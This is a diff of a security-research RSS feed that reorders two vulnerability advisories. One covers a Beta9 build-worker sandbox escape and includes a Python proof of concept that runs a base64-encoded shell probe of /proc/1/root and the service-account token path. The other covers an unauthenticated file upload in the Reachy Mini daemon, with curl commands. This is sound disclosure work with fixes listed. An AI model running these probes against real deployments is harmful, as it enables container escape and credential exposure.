@@ -4,11 +4,217 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Sun, 01 Nov 2026 13:41:32 GMT</lastBuildDate>
+        <lastBuildDate>Sun, 01 Nov 2026 13:41:58 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/vulnerabilities/rss.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120306, CRITICAL, Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation
+
+
+## Component
+
+Beta9 worker (github.com/beam-cloud/beta9)
+
+## Affected versions
+
+worker < 0.1.756
+
+## Description
+
+Beta9 turns each shell command in a tenant image definition into a Dockerfile RUN line and executes it with Buildah on a build worker. The worker image sets `BUILDAH_ISOLATION=chroot`, and no `buildah` invocation passes `--isolation`, so the step only changes its filesystem root. It keeps the worker pod's PID, network, IPC, and user namespaces, runs as uid 0, and holds `CAP_DAC_OVERRIDE`. Pid 1 in that procfs is the worker entrypoint, so `/proc/1/root` is the worker container's filesystem and is writable.
+
+That filesystem holds `runc`, `buildah`, and `runsc`, the binaries the worker uses to start tenant containers, the worker's Kubernetes service account token, and the host directories mounted into the pod. Worker pods are privileged. Clip v2 layered builds are the default, so a tenant with a workspace token reaches this by submitting one image build. A read-only probe confirmed the shared namespaces, `CAP_DAC_OVERRIDE`, and that the worker `runc` binary is visible at `/proc/1/root`.
+
+Worker 0.1.756 runs Buildah RUN steps, including the WORKDIR mkdir, under OCI isolation with private PID, IPC, and network namespaces. Tenant build arguments are passed into the build container rather than into the Buildah process environment.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the client and select the deployment**
+
+<br>
+
+Any workspace token is enough. No pool selector, custom base image, or Docker option is required.
+
+```
+pip install beta9
+beta9 configure
+```
+
+<br>
+
+**Step 2 - Save the read-only probe**
+
+<br>
+
+The probe reports uid, namespace identity, the effective capability mask, and whether the worker's `runc` binary and service-account token path are visible through `/proc/1/root`. It does not write, delete, or print secret material. The nonce on the RUN line keeps the build off the image cache.
+
+```
+#!/usr/bin/env python3
+import base64
+import re
+import sys
+import uuid
+
+from beta9.abstractions.image import Image
+from beta9.clients.image import BuildImageRequest
+
+MARK = "B9PROBE"
+
+PROBE = r"""
+set -u
+M=B9PROBE
+R=/proc/1/root
+
+echo "$M uid=$(id -u) pid=$$"
+echo "$M caps_self=$(awk '/^CapEff/{print $2}' /proc/self/status)"
+echo "$M pidns_self=$(readlink /proc/self/ns/pid)"
+echo "$M userns_self=$(readlink /proc/self/ns/user)"
+echo "$M netns_self=$(readlink /proc/self/ns/net)"
+echo "$M visible_pids=$(ls /proc | grep -c '^[0-9][0-9]*$')"
+echo "$M init_cmd=$(tr '\0' ' ' < /proc/1/cmdline | tr -s ' ' '_')"
+echo "$M caps_init=$(awk '/^CapEff/{print $2}' /proc/1/status)"
+echo "$M pidns_init=$(readlink /proc/1/ns/pid)"
+echo "$M userns_init=$(readlink /proc/1/ns/user)"
+
+if [ -e "$R/usr/local/sbin/runc" ]; then
+  echo "$M worker_runc=present"
+else
+  echo "$M worker_runc=absent"
+fi
+
+if [ -r "$R/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
+  echo "$M sa_token=readable"
+else
+  echo "$M sa_token=unreachable"
+fi
+
+if [ -d "$R/images" ]; then
+  echo "$M images_mount=present"
+else
+  echo "$M images_mount=absent"
+fi
+
+exit 0
+"""
+
+
+def probe_command() -> str:
+    blob = base64.b64encode(PROBE.encode()).decode()
+    return f"echo {blob} | base64 -d | sh  # {uuid.uuid4().hex}"
+
+
+def run_build(command: str):
+    log = []
+    for resp in Image(python_version="python3", commands=[command]).stub.build_image(
+        BuildImageRequest(
+            python_version="python3",
+            commands=[command],
+            ignore_python=True,
+        )
+    ):
+        if resp.msg:
+            sys.stdout.write(resp.msg)
+            sys.stdout.flush()
+            log.extend(line for line in resp.msg.splitlines() if MARK in line)
+        if resp.done:
+            break
+    return log
+
+
+def parse(log):
+    facts = {}
+    for line in log:
+        tail = line.split(MARK, 1)[1]
+        for key, value in re.findall(r"(\w+)=(\S+)", tail):
+            facts[key] = value
+    return facts
+
+
+def has_dac_override(cap_hex: str) -> bool:
+    try:
+        return bool(int(cap_hex, 16) & 0x2)
+    except ValueError:
+        return False
+
+
+def main() -> int:
+    facts = parse(run_build(probe_command()))
+    if not facts:
+        print("\nINCONCLUSIVE: the build log carried no probe output")
+        return 2
+
+    print("\nProbe results")
+    for key in sorted(facts):
+        print(f"  {key} = {facts[key]}")
+
+    neighbour = facts.get("worker_runc") == "present" or "worker" in facts.get("init_cmd", "")
+    dac_override = has_dac_override(facts.get("caps_self", "0"))
+    print()
+    if neighbour and dac_override:
+        print(
+            f"VULNERABLE: the build step ran as uid {facts.get('uid')} as pid "
+            f"{facts.get('pid')} inside the worker's own PID and user namespaces, "
+            f"resolved the worker container's filesystem at /proc/1/root, and holds "
+            f"CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem"
+        )
+        return 1
+
+    print("NOT VULNERABLE: the build step saw only its own container")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+<br>
+
+**Step 3 - Run the probe**
+
+<br>
+
+```
+python3 poc_beta9_build_isolation.py
+```
+
+<br>
+
+Expected output on a worker before 0.1.756:
+
+```
+VULNERABLE: the build step ran as uid 0 as pid <host pid> inside the worker's own PID and user namespaces, resolved the worker container's filesystem at /proc/1/root, and holds CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem
+```
+
+<br>
+
+The lines above that verdict include `worker_runc = present`, a `caps_self` mask with the `CAP_DAC_OVERRIDE` bit set, an `init_cmd` naming the worker entrypoint, and a `visible_pids` count covering the worker pod. On worker 0.1.756 or later the same build prints `NOT VULNERABLE: the build step saw only its own container`.
+
+## Vulnerability Mitigations
+
+Upgrade the Beta9 worker to 0.1.756 or later. That release drops chroot isolation. Buildah RUN steps use OCI isolation with private PID, IPC, and network namespaces, and tenant build arguments are applied inside the build container.
+
+The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released as worker 0.1.756 on 2026-09-15. Gateway 0.1.776 is the gateway tag cut from the same commit. The isolation change is in the worker image.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120306
+https://github.com/beam-cloud/beta9/pull/1897
+https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths]]></title>
             <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</link>
@@ -210,212 +416,6 @@ The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf000
 
 ## References
 https://www.cve.org/CVERecord?id=CVE-2026-120307
-https://github.com/beam-cloud/beta9/pull/1897
-https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
-https://github.com/beam-cloud/beta9
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</guid>
-            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-120306, CRITICAL, Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation
-
-
-## Component
-
-Beta9 worker (github.com/beam-cloud/beta9)
-
-## Affected versions
-
-worker < 0.1.756
-
-## Description
-
-Beta9 turns each shell command in a tenant image definition into a Dockerfile RUN line and executes it with Buildah on a build worker. The worker image sets `BUILDAH_ISOLATION=chroot`, and no `buildah` invocation passes `--isolation`, so the step only changes its filesystem root. It keeps the worker pod's PID, network, IPC, and user namespaces, runs as uid 0, and holds `CAP_DAC_OVERRIDE`. Pid 1 in that procfs is the worker entrypoint, so `/proc/1/root` is the worker container's filesystem and is writable.
-
-That filesystem holds `runc`, `buildah`, and `runsc`, the binaries the worker uses to start tenant containers, the worker's Kubernetes service account token, and the host directories mounted into the pod. Worker pods are privileged. Clip v2 layered builds are the default, so a tenant with a workspace token reaches this by submitting one image build. A read-only probe confirmed the shared namespaces, `CAP_DAC_OVERRIDE`, and that the worker `runc` binary is visible at `/proc/1/root`.
-
-Worker 0.1.756 runs Buildah RUN steps, including the WORKDIR mkdir, under OCI isolation with private PID, IPC, and network namespaces. Tenant build arguments are passed into the build container rather than into the Buildah process environment.
-
-## PoC
-
-<br>
-
-**Step 1 - Install the client and select the deployment**
-
-<br>
-
-Any workspace token is enough. No pool selector, custom base image, or Docker option is required.
-
-```
-pip install beta9
-beta9 configure
-```
-
-<br>
-
-**Step 2 - Save the read-only probe**
-
-<br>
-
-The probe reports uid, namespace identity, the effective capability mask, and whether the worker's `runc` binary and service-account token path are visible through `/proc/1/root`. It does not write, delete, or print secret material. The nonce on the RUN line keeps the build off the image cache.
-
-```
-#!/usr/bin/env python3
-import base64
-import re
-import sys
-import uuid
-
-from beta9.abstractions.image import Image
-from beta9.clients.image import BuildImageRequest
-
-MARK = "B9PROBE"
-
-PROBE = r"""
-set -u
-M=B9PROBE
-R=/proc/1/root
-
-echo "$M uid=$(id -u) pid=$$"
-echo "$M caps_self=$(awk '/^CapEff/{print $2}' /proc/self/status)"
-echo "$M pidns_self=$(readlink /proc/self/ns/pid)"
-echo "$M userns_self=$(readlink /proc/self/ns/user)"
-echo "$M netns_self=$(readlink /proc/self/ns/net)"
-echo "$M visible_pids=$(ls /proc | grep -c '^[0-9][0-9]*$')"
-echo "$M init_cmd=$(tr '\0' ' ' < /proc/1/cmdline | tr -s ' ' '_')"
-echo "$M caps_init=$(awk '/^CapEff/{print $2}' /proc/1/status)"
-echo "$M pidns_init=$(readlink /proc/1/ns/pid)"
-echo "$M userns_init=$(readlink /proc/1/ns/user)"
-
-if [ -e "$R/usr/local/sbin/runc" ]; then
-  echo "$M worker_runc=present"
-else
-  echo "$M worker_runc=absent"
-fi
-
-if [ -r "$R/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
-  echo "$M sa_token=readable"
-else
-  echo "$M sa_token=unreachable"
-fi
-
-if [ -d "$R/images" ]; then
-  echo "$M images_mount=present"
-else
-  echo "$M images_mount=absent"
-fi
-
-exit 0
-"""
-
-
-def probe_command() -> str:
-    blob = base64.b64encode(PROBE.encode()).decode()
-    return f"echo {blob} | base64 -d | sh  # {uuid.uuid4().hex}"
-
-
-def run_build(command: str):
-    log = []
-    for resp in Image(python_version="python3", commands=[command]).stub.build_image(
-        BuildImageRequest(
-            python_version="python3",
-            commands=[command],
-            ignore_python=True,
-        )
-    ):
-        if resp.msg:
-            sys.stdout.write(resp.msg)
-            sys.stdout.flush()
-            log.extend(line for line in resp.msg.splitlines() if MARK in line)
-        if resp.done:
-            break
-    return log
-
-
-def parse(log):
-    facts = {}
-    for line in log:
-        tail = line.split(MARK, 1)[1]
-        for key, value in re.findall(r"(\w+)=(\S+)", tail):
-            facts[key] = value
-    return facts
-
-
-def has_dac_override(cap_hex: str) -> bool:
-    try:
-        return bool(int(cap_hex, 16) & 0x2)
-    except ValueError:
-        return False
-
-
-def main() -> int:
-    facts = parse(run_build(probe_command()))
-    if not facts:
-        print("\nINCONCLUSIVE: the build log carried no probe output")
-        return 2
-
-    print("\nProbe results")
-    for key in sorted(facts):
-        print(f"  {key} = {facts[key]}")
-
-    neighbour = facts.get("worker_runc") == "present" or "worker" in facts.get("init_cmd", "")
-    dac_override = has_dac_override(facts.get("caps_self", "0"))
-    print()
-    if neighbour and dac_override:
-        print(
-            f"VULNERABLE: the build step ran as uid {facts.get('uid')} as pid "
-            f"{facts.get('pid')} inside the worker's own PID and user namespaces, "
-            f"resolved the worker container's filesystem at /proc/1/root, and holds "
-            f"CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem"
-        )
-        return 1
-
-    print("NOT VULNERABLE: the build step saw only its own container")
-    return 0
-
-
-if __name__ == "__main__":
-    raise SystemExit(main())
-```
-
-<br>
-
-**Step 3 - Run the probe**
-
-<br>
-
-```
-python3 poc_beta9_build_isolation.py
-```
-
-<br>
-
-Expected output on a worker before 0.1.756:
-
-```
-VULNERABLE: the build step ran as uid 0 as pid <host pid> inside the worker's own PID and user namespaces, resolved the worker container's filesystem at /proc/1/root, and holds CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem
-```
-
-<br>
-
-The lines above that verdict include `worker_runc = present`, a `caps_self` mask with the `CAP_DAC_OVERRIDE` bit set, an `init_cmd` naming the worker entrypoint, and a `visible_pids` count covering the worker pod. On worker 0.1.756 or later the same build prints `NOT VULNERABLE: the build step saw only its own container`.
-
-## Vulnerability Mitigations
-
-Upgrade the Beta9 worker to 0.1.756 or later. That release drops chroot isolation. Buildah RUN steps use OCI isolation with private PID, IPC, and network namespaces, and tenant build arguments are applied inside the build container.
-
-The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released as worker 0.1.756 on 2026-09-15. Gateway 0.1.776 is the gateway tag cut from the same commit. The isolation change is in the worker image.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-120306
 https://github.com/beam-cloud/beta9/pull/1897
 https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
@@ -1668,6 +1668,82 @@ https://nvd.nist.gov/vuln/detail/CVE-2026-8461
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/the-reachy-mini-daemon-is-vulnerable-to-an-unrestricted-file-upload-in-the-media-sounds-upload-api-cve-2026-55419/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/the-reachy-mini-daemon-is-vulnerable-to-an-unrestricted-file-upload-in-the-media-sounds-upload-api-cve-2026-55419/</guid>
+            <pubDate>Mon, 15 Jun 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-55419, MEDIUM, The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API
+
+
+## Component
+
+reachy-mini (reachy_mini daemon)
+
+## Affected versions
+
+< 1.8.2
+
+## Description
+
+The Reachy Mini daemon exposes POST /api/media/sounds/upload without authentication or file validation. An unauthenticated attacker can upload arbitrary files (not only sound files) into /tmp/reachy_mini_sounds/<original_filename> on the daemon host. The handler in src/daemon/app/routers/media.py (upload_sound) strips path traversal from the filename but does not enforce an extension allow-list, content checks, or size limits. The daemon binds 0.0.0.0 by default and uses permissive CORS (allow_origins=["*"]), so the endpoint is reachable on every network interface the daemon is connected to. This issue is the first step in a documented compromise chain that also includes Bluetooth authentication bypass and Bluetooth directory traversal.
+
+## PoC
+
+<br>
+
+**Step 1 - Start the daemon**
+
+<br>
+
+```
+.venv/bin/mjpython -m reachy_mini.daemon.app.main --sim --no-media
+```
+
+<br>
+
+**Step 2 - Confirm a normal wav upload works**
+
+<br>
+
+```
+curl -X POST http://<daemon_host>:<daemon_port>/api/media/sounds/upload \
+  -F "file=@/path/to/your/file.wav"
+```
+
+<br>
+
+**Step 3 - Upload an arbitrary shell script**
+
+<br>
+
+```
+curl -X POST http://<daemon_host>:<daemon_port>/api/media/sounds/upload \
+  -F "file=@/path/to/your/script.sh"
+```
+<br>
+
+**Step 4 - Verify the file was written**
+
+<br>
+
+The script is stored under /tmp/reachy_mini_sounds/ with no authentication challenge and no type rejection, confirming unrestricted upload.
+
+## Vulnerability Mitigations
+
+Upgrade to reachy-mini 1.8.2 or later. The fix allow-lists sound extensions, caps upload size, and validates content with GStreamer so only playable audio is accepted (https://github.com/pollen-robotics/reachy_mini/pull/1209). Until then, restrict network access to the daemon (firewall port 8000) and do not expose the media upload API on untrusted networks.
+
+## References
+https://github.com/pollen-robotics/reachy_mini/security/advisories/GHSA-m2pc-3q4q-w6jr
+https://github.com/pollen-robotics/reachy_mini/commit/984c7723b3ec5da63f4e0a2bcf9f120ceb563e04
+https://github.com/pollen-robotics/reachy_mini/releases/tag/v1.8.2
+https://nvd.nist.gov/vuln/detail/CVE-2026-55419
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[The Reachy Mini Wireless image is vulnerable to a Local Privilege Escalation via an Unrestricted sudo systemctl Grant]]></title>
             <link>https://research.jfrog.com/vulnerabilities/the-reachy-mini-wireless-image-is-vulnerable-to-a-local-privilege-escalation-via-an-unrestricted-sudo-systemctl-grant-jfsa-2026-001667223/</link>
             <guid>https://research.jfrog.com/vulnerabilities/the-reachy-mini-wireless-image-is-vulnerable-to-a-local-privilege-escalation-via-an-unrestricted-sudo-systemctl-grant-jfsa-2026-001667223/</guid>
@@ -1790,82 +1866,6 @@ Upgrade or log in as root (or via sudo -i), then:
 https://github.com/pollen-robotics/reachy-mini-os/security/advisories/GHSA-7rhg-9v48-x3h2
 
 
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/the-reachy-mini-daemon-is-vulnerable-to-an-unrestricted-file-upload-in-the-media-sounds-upload-api-cve-2026-55419/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/the-reachy-mini-daemon-is-vulnerable-to-an-unrestricted-file-upload-in-the-media-sounds-upload-api-cve-2026-55419/</guid>
-            <pubDate>Mon, 15 Jun 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-55419, MEDIUM, The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API
-
-
-## Component
-
-reachy-mini (reachy_mini daemon)
-
-## Affected versions
-
-< 1.8.2
-
-## Description
-
-The Reachy Mini daemon exposes POST /api/media/sounds/upload without authentication or file validation. An unauthenticated attacker can upload arbitrary files (not only sound files) into /tmp/reachy_mini_sounds/<original_filename> on the daemon host. The handler in src/daemon/app/routers/media.py (upload_sound) strips path traversal from the filename but does not enforce an extension allow-list, content checks, or size limits. The daemon binds 0.0.0.0 by default and uses permissive CORS (allow_origins=["*"]), so the endpoint is reachable on every network interface the daemon is connected to. This issue is the first step in a documented compromise chain that also includes Bluetooth authentication bypass and Bluetooth directory traversal.
-
-## PoC
-
-<br>
-
-**Step 1 - Start the daemon**
-
-<br>
-
-```
-.venv/bin/mjpython -m reachy_mini.daemon.app.main --sim --no-media
-```
-
-<br>
-
-**Step 2 - Confirm a normal wav upload works**
-
-<br>
-
-```
-curl -X POST http://<daemon_host>:<daemon_port>/api/media/sounds/upload \
-  -F "file=@/path/to/your/file.wav"
-```
-
-<br>
-
-**Step 3 - Upload an arbitrary shell script**
-
-<br>
-
-```
-curl -X POST http://<daemon_host>:<daemon_port>/api/media/sounds/upload \
-  -F "file=@/path/to/your/script.sh"
-```
-<br>
-
-**Step 4 - Verify the file was written**
-
-<br>
-
-The script is stored under /tmp/reachy_mini_sounds/ with no authentication challenge and no type rejection, confirming unrestricted upload.
-
-## Vulnerability Mitigations
-
-Upgrade to reachy-mini 1.8.2 or later. The fix allow-lists sound extensions, caps upload size, and validates content with GStreamer so only playable audio is accepted (https://github.com/pollen-robotics/reachy_mini/pull/1209). Until then, restrict network access to the daemon (firewall port 8000) and do not expose the media upload API on untrusted networks.
-
-## References
-https://github.com/pollen-robotics/reachy_mini/security/advisories/GHSA-m2pc-3q4q-w6jr
-https://github.com/pollen-robotics/reachy_mini/commit/984c7723b3ec5da63f4e0a2bcf9f120ceb563e04
-https://github.com/pollen-robotics/reachy_mini/releases/tag/v1.8.2
-https://nvd.nist.gov/vuln/detail/CVE-2026-55419
 ]]></content:encoded>
         </item>
         <item>
